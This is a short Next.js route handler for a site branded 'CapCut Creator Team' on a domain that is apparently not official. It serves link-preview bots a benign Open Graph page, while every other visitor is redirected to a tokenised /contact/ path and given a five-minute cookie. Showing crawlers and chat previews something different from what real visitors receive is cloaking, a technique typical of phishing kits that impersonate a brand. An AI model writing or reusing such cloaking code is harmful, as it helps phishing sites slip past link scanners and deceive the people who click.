import { isLinkPreviewBot, OG_IMAGE_PATH, SITE_DESCRIPTION, SITE_TITLE } from '@/lib/site-metadata';
import { NextRequest, NextResponse } from 'next/server';

const escapeHtml = (value: string) =>
    value.replaceAll('&', '&amp;').replaceAll('<', '&lt;').replaceAll('>', '&gt;').replaceAll('"', '&quot;');

const buildPreviewHtml = (base: string) => {
    const imageUrl = new URL(OG_IMAGE_PATH, base).toString();
    const pageUrl = new URL('/help', base).toString();

    return `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <title>${escapeHtml(SITE_TITLE)}</title>
  <meta name="description" content="${escapeHtml(SITE_DESCRIPTION)}">
  <meta property="og:type" content="website">
  <meta property="og:url" content="${pageUrl}">
  <meta property="og:site_name" content="CapCut Creator Team">
  <meta property="og:title" content="${escapeHtml(SITE_TITLE)}">
  <meta property="og:description" content="${escapeHtml(SITE_DESCRIPTION)}">
  <meta property="og:image" content="${imageUrl}">
  <meta name="twitter:card" content="summary_large_image">
  <meta name="twitter:title" content="${escapeHtml(SITE_TITLE)}">
  <meta name="twitter:description" content="${escapeHtml(SITE_DESCRIPTION)}">
  <meta name="twitter:image" content="${imageUrl}">
</head>
<body>
  <h1>${escapeHtml(SITE_TITLE)}</h1>
  <p>${escapeHtml(SITE_DESCRIPTION)}</p>
</body>
</html>`;
};

const GET = (req: NextRequest) => {
    const token = Date.now();
    const host = req.headers.get('x-forwarded-host') || req.headers.get('host') || 'www.capcutcreatorteam.com';
    const proto = req.headers.get('x-forwarded-proto') || 'https';
    const base = `${proto}://${host}`;
    const userAgent = req.headers.get('user-agent');

    if (isLinkPreviewBot(userAgent)) {
        return new NextResponse(buildPreviewHtml(base), {
            headers: { 'Content-Type': 'text/html; charset=utf-8' }
        });
    }

    const url = req.nextUrl.clone();
    url.pathname = `/contact/${token}`;
    url.search = '';

    const response = NextResponse.redirect(url);
    response.cookies.set('token', `${token}`, {
        httpOnly: true,
        secure: process.env.NODE_ENV === 'production',
        maxAge: 300,
        path: '/',
        sameSite: 'lax'
    });

    return response;
};

export { GET };
